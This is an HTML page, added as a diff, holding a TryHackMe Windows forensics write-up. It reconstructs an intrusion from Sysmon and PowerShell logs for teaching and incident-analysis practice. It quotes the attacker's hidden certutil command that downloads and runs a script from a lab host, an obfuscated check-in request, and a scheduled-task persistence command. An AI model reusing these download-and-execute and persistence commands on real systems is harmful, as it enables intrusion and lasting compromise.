@@ -1,0 +1,580 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Handbook for the Recently Compromised — THM Write-up</title>
+    <meta name="description" content="A Windows workstation was flagged for unusual activity." />
+    <meta name="theme-color" content="#0c0d10" />
+    <link rel="stylesheet" href="/style.css" />
+    <link rel="stylesheet" href="/about.css" />
+    <link rel="stylesheet" href="/projects.css" />
+    <link rel="stylesheet" href="/research.css" />
+    <link rel="stylesheet" href="/theme.css" />
+    <link
+      rel="canonical"
+      href="https://sacit-security-portfolio.dmncdcco.chatgpt.site/write-ups/handbook-for-the-recently-compromised/"
+    />
+    <link
+      rel="icon"
+      href="/assets/brand/sacit-cinar-castle.svg?v=castle-original7"
+      type="image/svg+xml"
+    />
+    <link rel="icon" href="/favicon-32.png?v=castle-original7" sizes="32x32" type="image/png" />
+    <link rel="shortcut icon" href="/favicon.ico?v=castle-original7" />
+    <link rel="stylesheet" href="/cheat-sheets.css" />
+    <link rel="stylesheet" href="/typography.css" />
+    <link rel="stylesheet" href="/palette.css" />
+    <link rel="stylesheet" href="/i18n.css" />
+    <script src="/i18n.js" defer></script>
+  </head>
+  <body data-section-page="writeups">
+    <header class="site-header">
+      <div class="header-inner">
+        <a class="brand" data-section="home" href="/index.html" aria-label="Sacit Çınar — About"
+          ><span class="brand-mark" aria-hidden="true"
+            ><img
+              src="/assets/brand/sacit-cinar-castle.svg?v=castle-original7"
+              width="34"
+              height="36"
+              alt=""
+              aria-hidden="true" /></span
+          ><span class="brand-copy"
+            ><span class="brand-name">sacit çınar</span
+            ><span class="brand-prompt"
+              >dominic@kali:~$<span class="terminal-cursor" aria-hidden="true"></span></span></span
+        ></a>
+        <nav aria-label="Main navigation">
+          <a href="/index.html" data-section="home">About</a
+          ><a href="/research.html" data-section="research">Research</a
+          ><a href="/projects.html" data-section="projects">Projects</a
+          ><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page"
+            >Write-ups</a
+          ><a href="/cheat-sheets.html" data-section="cheatsheets">Codex</a
+          ><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a>
+        </nav>
+      </div>
+    </header>
+    <main class="projects-main research-detail writeup-detail">
+      <a class="project-return" data-section="writeups" href="/write-ups.html">← All write-ups</a>
+      <section class="research-hero">
+        <div class="project-meta">
+          <span class="project-badge badge-thm">THM</span
+          ><span class="project-badge">WINDOWS FORENSICS</span
+          ><span class="project-badge">EASY</span>
+        </div>
+        <h1>Handbook for the Recently Compromised</h1>
+        <p class="research-deck">A Windows workstation was flagged for unusual activity.</p>
+        <p class="research-byline">
+          By Mehmet Sacit Çınar · <time datetime="2026-10-28">28 October 2026</time>
+        </p>
+      </section>
+      <div class="research-layout">
+        <aside class="article-toc">
+          <p>IN THIS WRITE-UP</p>
+          <nav aria-label="Table of contents">
+            <a href="#scenario">Scenario</a><a href="#preparing-the-logs">Preparing the Logs</a
+            ><a href="#task-1">Question 1</a><a href="#task-2">Question 2</a
+            ><a href="#task-3">Question 3</a><a href="#task-4">Question 4</a
+            ><a href="#task-5">Question 5</a><a href="#findings">Findings</a>
+          </nav>
+        </aside>
+        <article class="research-copy writeup-copy">
+          <h3 id="scenario">Scenario</h3>
+          <p>
+            A Windows workstation was flagged for unusual activity. The investigation required
+            examining its event logs, identifying suspicious actions, and reconstructing how the
+            host was compromised.
+          </p>
+          <p>
+            Sysmon provided process execution details, while the PowerShell log exposed script
+            content associated with the intrusion.
+          </p>
+          <div class="report-table-wrap">
+            <table class="report-table">
+              <thead>
+                <tr>
+                  <th scope="col">Field</th>
+                  <th scope="col">Details</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Platform</td>
+                  <td>TryHackMe</td>
+                </tr>
+                <tr>
+                  <td>Difficulty</td>
+                  <td>Easy</td>
+                </tr>
+                <tr>
+                  <td>Category</td>
+                  <td>Windows Forensics / Log Analysis</td>
+                </tr>
+                <tr>
+                  <td>Evidence</td>
+                  <td>Sysmon and PowerShell event logs (<code>.evtx</code>)</td>
+                </tr>
+                <tr>
+                  <td>Tools</td>
+                  <td>evtx_dump</td>
+                </tr>
+                <tr>
+                  <td>Author</td>
+                  <td>dmncdcco</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <h2 id="preparing-the-logs">Preparing the Logs</h2>
+          <p>The supplied EVTX files were converted into JSONL for command-line analysis:</p>
+          <div class="writeup-terminal">
+            <div class="writeup-terminal-bar">
+              <span class="writeup-terminal-title">Terminal</span
+              ><button
+                aria-controls="handbook-for-the-recently-compromised-code-1"
+                aria-label="Copy code to clipboard"
+                class="copy-code"
+                type="button"
+              >
+                <span data-copy-label="">Copy</span>
+              </button>
+            </div>
+            <pre
+              id="handbook-for-the-recently-compromised-code-1"
+            ><code class="language-bash">../tools/evtx_dump -o jsonl -f sysmon.jsonl 'Microsoft-Windows-Sysmon%4Operational.evtx'
+</code></pre>
+          </div>
+          <div class="writeup-terminal">
+            <div class="writeup-terminal-bar">
+              <span class="writeup-terminal-title">Terminal</span
+              ><button
+                aria-controls="handbook-for-the-recently-compromised-code-2"
+                aria-label="Copy code to clipboard"
+                class="copy-code"
+                type="button"
+              >
+                <span data-copy-label="">Copy</span>
+              </button>
+            </div>
+            <pre
+              id="handbook-for-the-recently-compromised-code-2"
+            ><code class="language-bash">../tools/evtx_dump -o jsonl -f powershell.jsonl 'PowerShell-Operational.evtx'
+</code></pre>
+          </div>
+          <p>
+            JSONL stores each event on a separate line, allowing matching events to be selected with
+            <code>grep</code> and formatted with <code>jq</code>.
+          </p>
+          <section class="autoit-task" id="task-1">
+            <h2>Question 1</h2>
+            <p class="task-question">
+              A trusted Windows utility downloaded a second-stage script onto the host. The command
+              that called the utility obscured its name with a wildcard. What is the utility’s full
+              executable name?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>certutil.exe</code></p>
+                <p>
+                  The Sysmon JSONL output was searched for records containing both an HTTP reference
+                  and a literal wildcard character:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">Terminal</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-3"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-3"
+                  ><code class="language-bash">grep -niE 'http|https' sysmon.jsonl | grep -F '*'
+</code></pre>
+                </div>
+                <p>
+                  The results included a process creation event with the following PowerShell
+                  command:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">PowerShell</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-4"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-4"
+                  ><code class="language-powershell">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"
+</code></pre>
+                </div>
+                <p>The executable name was obscured through this expression:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">PowerShell</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-5"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-5"
+                  ><code class="language-powershell">&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName)
+</code></pre>
+                </div>
+                <p>
+                  <code>gci</code>, an alias for <code>Get-ChildItem</code>, searches for
+                  executables matching <code>certu*.exe</code>. <code>[0].FullName</code> retrieves
+                  the full path of the first match, and the call operator
+                  <code>&amp;</code> executes it. The remaining arguments instruct the utility to
+                  download <code>pipeline-sync.ps1</code> into the user’s temporary directory.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-2">
+            <h2>Question 2</h2>
+            <p class="task-question">
+              What full URL did the utility retrieve the second-stage script from?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer">
+                  <strong>Answer:</strong>
+                  <code>http://pipeline-cdn.thm:8088/pipeline-sync.ps1</code>
+                </p>
+                <p>
+                  The command identified in the previous question contained the download URL
+                  immediately after the <code>-urlcache -f</code> arguments:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">Output</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-6"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-6"
+                  ><code class="language-text">-urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1
+</code></pre>
+                </div>
+                <p>
+                  The source URL points to <code>pipeline-sync.ps1</code>, which the command saves
+                  into the user’s temporary directory.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-3">
+            <h2>Question 3</h2>
+            <p class="task-question">
+              Which MITRE ATT&amp;CK sub-technique describes the abuse of the Windows scripting host
+              that executed the initial attachment?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>T1218.005</code></p>
+                <p>
+                  The grep output from Question 1 also showed <code>mshta.exe</code> as the parent
+                  of the PowerShell process. The relevant parent process fields identified the HTA
+                  attachment:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">Output</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-7"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-7"
+                  ><code class="language-text">ParentImage: C:\Windows\SysWOW64\mshta.exe
+ParentCommandLine (excerpt): "C:\Windows\SysWOW64\mshta.exe" "C:\Users\j.collins\Downloads\pipeline-check.hta"
+</code></pre>
+                </div>
+                <p>
+                  The use of <code>mshta.exe</code> to execute the HTA attachment maps to
+                  <strong>T1218.005 — Mshta</strong>.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-4">
+            <h2>Question 4</h2>
+            <p class="task-question">
+              Which MITRE ATT&amp;CK sub-technique describes the persistence mechanism the intruder
+              configured?
+            </p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>T1053.005</code></p>
+                <p>The PowerShell log was searched for scheduled task commands:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">Terminal</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-8"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-8"
+                  ><code class="language-bash">grep -i 'schtasks' powershell.jsonl | jq | less
+</code></pre>
+                </div>
+                <p>The matching event contained the following <code>EventData</code>:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">JSON</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-9"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-9"
+                  ><code class="language-json">{
+  "EventData": {
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "ScriptBlockText": "try { Invoke-WebRequest -Uri (-join('htt','p://pip','el','ine','-cdn.th','m:','808','8/check','in')) -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}\nschtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\\U','se','rs\\j','.','collins','\\AppDat','a\\Roamin','g\\Pipeli','neSyn','c\\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f\n$blob = ('&lt;REDACTED_BASE64&gt;')\n$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))\n$dir = ($env:TEMP + ('\\Pipe'+'lineS'+'ync'))\nNew-Item $dir -ItemType Directory -Force | Out-Null\nSet-Content ($dir + ('\\.sy'+'nc-c'+'ach'+'e')) $flag\r\n",
+    "ScriptBlockId": "2b2a68a0-ea6a-43f8-b971-4b2db58eeff6",
+    "Path": "C:\\Users\\j.collins\\AppData\\Local\\Temp\\pipeline-sync.ps1"
+  }
+}
+</code></pre>
+                </div>
+                <p>
+                  Within <code>ScriptBlockText</code>, the task name and execution command were
+                  obscured through string fragmentation:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">PowerShell</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-10"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-10"
+                  ><code class="language-powershell">schtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\U','se','rs\j','.','collins','\AppDat','a\Roamin','g\Pipeli','neSyn','c\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f
+</code></pre>
+                </div>
+                <p>Joining those fragments revealed:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">PowerShell</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-11"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-11"
+                  ><code class="language-powershell">schtasks /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f
+</code></pre>
+                </div>
+                <p>
+                  The command creates a task named <code>StudioPipelineSync</code> to run the script
+                  through hidden PowerShell at logon (<code>/sc onlogon</code>), requesting the
+                  highest available privileges (<code>/rl highest</code>). This persistence
+                  mechanism maps to <strong>T1053.005 — Scheduled Task/Job: Scheduled Task</strong>.
+                </p>
+              </div>
+            </details>
+          </section>
+          <section class="autoit-task" id="task-5">
+            <h2>Question 5</h2>
+            <p class="task-question">What is the flag?</p>
+            <details class="answer-spoiler">
+              <summary>Reveal answer</summary>
+              <div class="answer-content">
+                <p class="task-answer"><strong>Answer:</strong> <code>THM{REDACTED}</code></p>
+                <p>
+                  The same PowerShell output examined in Question 4 contained a fragmented Base64
+                  string and its decoding logic:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">PowerShell</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-12"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-12"
+                  ><code class="language-powershell">$blob = ('&lt;REDACTED_BASE64&gt;')
+$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))
+</code></pre>
+                </div>
+                <p>The fragments were joined and decoded in the terminal:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">Terminal</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-13"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-13"
+                  ><code class="language-bash">printf '%s' '&lt;REDACTED_BASE64&gt;' | base64 -d
+</code></pre>
+                </div>
+                <p>The decoded output revealed the flag:</p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">Output</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-14"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-14"
+                  ><code class="language-text">THM{REDACTED}
+</code></pre>
+                </div>
+                <p>
+                  The remaining script instructions also showed that the decoded flag was written to
+                  <code>.sync-cache</code> under <code>%TEMP%\PipelineSync</code>:
+                </p>
+                <div class="writeup-terminal">
+                  <div class="writeup-terminal-bar">
+                    <span class="writeup-terminal-title">PowerShell</span
+                    ><button
+                      aria-controls="handbook-for-the-recently-compromised-code-15"
+                      aria-label="Copy code to clipboard"
+                      class="copy-code"
+                      type="button"
+                    >
+                      <span data-copy-label="">Copy</span>
+                    </button>
+                  </div>
+                  <pre
+                    id="handbook-for-the-recently-compromised-code-15"
+                  ><code class="language-powershell">$dir = ($env:TEMP + ('\Pipe'+'lineS'+'ync'))
+New-Item $dir -ItemType Directory -Force | Out-Null
+Set-Content ($dir + ('\.sy'+'nc-c'+'ach'+'e')) $flag
+</code></pre>
+                </div>
+              </div>
+            </details>
+          </section>
+          <h2 id="findings">Findings</h2>
+          <p>
+            The initial HTA launched PowerShell through <code>mshta.exe</code>. A wildcard
+            expression invoked <code>certutil.exe</code> to download the second-stage script. The
+            PowerShell log exposed a logon scheduled task and the Base64-encoded flag.
+          </p>
+          <div class="report-table-wrap">
+            <table class="report-table">
+              <thead>
+                <tr>
+                  <th scope="col">Indicator</th>
+                  <th scope="col">Value</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Download URL</td>
+                  <td><code>http://pipeline-cdn.thm:8088/pipeline-sync.ps1</code></td>
+                </tr>
+                <tr>
+                  <td>Initial attachment</td>
+                  <td><code>pipeline-check.hta</code></td>
+                </tr>
+                <tr>
+                  <td>Scheduled task</td>
+                  <td><code>StudioPipelineSync</code></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <hr />
+          <p>
+            <em
+              >This write-up is intended for educational purposes and authorized security
+              research.</em
+            >
+          </p>
+        </article>
+      </div>
+    </main>
+    <footer class="site-footer">
+      <div class="footer-inner">
+        <p>© 2026 Mehmet Sacit Çınar</p>
+        <nav class="footer-nav" aria-label="Footer navigation">
+          <a href="/index.html" data-section="home">About</a
+          ><a href="/research.html" data-section="research">Research</a
+          ><a href="/projects.html" data-section="projects">Projects</a
+          ><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page"
+            >Write-ups</a
+          ><a href="/cheat-sheets.html" data-section="cheatsheets">Codex</a
+          ><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a>
+        </nav>
+      </div>
+    </footer>
+    <script src="/navigation.js" defer></script>
+    <script src="/writeup.js" defer></script>
+  </body>
+</html>
